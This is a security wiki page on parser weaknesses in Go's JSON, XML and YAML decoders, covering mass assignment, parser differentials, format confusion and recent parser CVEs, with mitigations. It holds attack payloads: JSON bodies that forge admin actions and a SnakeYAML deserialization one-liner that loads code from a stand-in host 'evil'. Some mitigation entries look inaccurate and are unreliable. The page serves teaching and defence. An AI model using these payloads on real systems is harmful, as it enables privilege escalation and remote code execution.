# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

The following issues were detected in the Go JSON although they could be present in other languages as well. These issues were published in [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Go’s JSON, XML, and YAML parsers have a long trail of inconsistencies and insecure defaults that can be abused to **bypass authentication**, **escalate privileges**, or **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

The goal is to exploit structs that allow an attacker to read/write sensitive fields (e.g., `IsAdmin`, `Password`).

- Example Struct:
```go
type User struct {
    Username string `json:"username,omitempty"`
    Password string `json:"password,omitempty"`
    IsAdmin  bool   `json:"-"`
}
```

- Common Vulnerabilities

1. **Missing tag** (no tag = field is still parsed by default):
```go
type User struct {
    Username string
}
```

Payload:
```json
{"Username": "admin"}
```

2. **Incorrect use of `-`**:
```go
type User struct {
    IsAdmin bool `json:"-,omitempty"` // ❌ wrong
}
```

Payload:
```json
{"-": true}
```

✔️ Proper way to block field from being (un)marshaled:
```go
type User struct {
    IsAdmin bool `json:"-"`
}
```


### Parser Differentials

The goal is to bypass authorization by exploiting how different parsers interpret the same payload differently like in:
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. Duplicate Fields:**
Go's `encoding/json` takes the **last** field.

```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```

Other parsers (e.g., Java’s Jackson) may take the **first**.

**2. Case Insensitivity:**
Go is case-insensitive:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```

Even Unicode tricks work:
```go
json.Unmarshal([]byte(`{"aKtionſ": "bypass"}`), &req)
```

**3. Cross-service mismatch:**
Imagine:
- Proxy written in Go
- AuthZ service written in Python

Attacker sends:
```json
{
  "action": "UserAction",
  "AcTiOn": "AdminAction"
}
```

- Python sees `UserAction`, allows it
- Go sees `AdminAction`, executes it


### Data Format Confusion (Polyglots)

The goal is to exploit systems that mix formats (JSON/XML/YAML) or fail open on parser errors like:
- **CVE-2020-16250**: HashiCorp Vault parsed JSON with an XML parser after STS returned JSON instead of XML.

Attacker controls:
- The `Accept: application/json` header
- Partial control of JSON body

Go’s XML parser parsed it **anyway** and trusted the injected identity.

- Crafted payload:
```json
{
  "action": "Action_1",
  "AcTiOn": "Action_2",
  "ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```

Result:
- **Go JSON** parser: `Action_2` (case-insensitive + last wins)
- **YAML** parser: `Action_1` (case-sensitive)
- **XML** parser: parses `"Action_3"` inside the string

---

## Notable Parser Vulnerabilities (2023-2025)

> The following publicly-exploitable issues show that insecure parsing is a multi-language problem — not just a Go problem.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Affects: `org.yaml:snakeyaml` < **2.0** (used by Spring-Boot, Jenkins, etc.).
* Root cause: `new Constructor()` deserializes **arbitrary Java classes**, allowing gadget chains that culminate in remote-code execution.
* One-liner PoC (will open the calculator on vulnerable host):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Fix / Mitigation:
  1. **Upgrade to ≥2.0** (uses `SafeLoader` by default).
  2. On older versions, explicitly use `new Yaml(new SafeConstructor())`. 

### libyaml Double-Free (CVE-2024-35325)

* Affects: `libyaml` ≤0.2.5 (C library leveraged by many language bindings).
* Issue: Calling `yaml_event_delete()` twice leads to a double-free that attackers can turn into DoS or, in some scenarios, heap exploitation.
* Status: Upstream rejected as “API misuse”, but Linux distributions shipped patched **0.2.6** that null-frees the pointer defensively. 

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Affects: Tencent **RapidJSON** before commit `8269bc2` (<1.1.0-patch-22).
* Bug: In `GenericReader::ParseNumber()` unchecked arithmetic lets attackers craft huge numeric literals that wrap around and corrupt the heap — ultimately enabling privilege-escalation when the resulting object graph is used for authorization decisions. 

---

### 🔐 Mitigations (Updated)

| Risk                                | Fix / Recommendation                                      |
|-------------------------------------|------------------------------------------------------------|
| Unknown fields (JSON)               | `decoder.DisallowUnknownFields()`                          |
| Duplicate fields (JSON)             | ❌ No fix in stdlib — validate with [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Case-insensitive match (Go)         | ❌ No fix — validate struct tags + pre-canonicalize input   |
| XML garbage data / XXE              | Use a hardened parser (`encoding/xml` + `DisallowDTD`)     |
| YAML unknown keys                   | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | Use SafeConstructor / upgrade to SnakeYAML ≥2.0            |
| libyaml ≤0.2.5 double-free          | Upgrade to **0.2.6** or distro-patched release            |
| RapidJSON <patched commit           | Compile against latest RapidJSON (≥July 2024)              |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## References

- Baeldung – “Resolving CVE-2022-1471 With SnakeYAML 2.0” 
- Ubuntu Security Tracker – CVE-2024-35325 (libyaml) 

{{#include ../banners/hacktricks-training.md}}
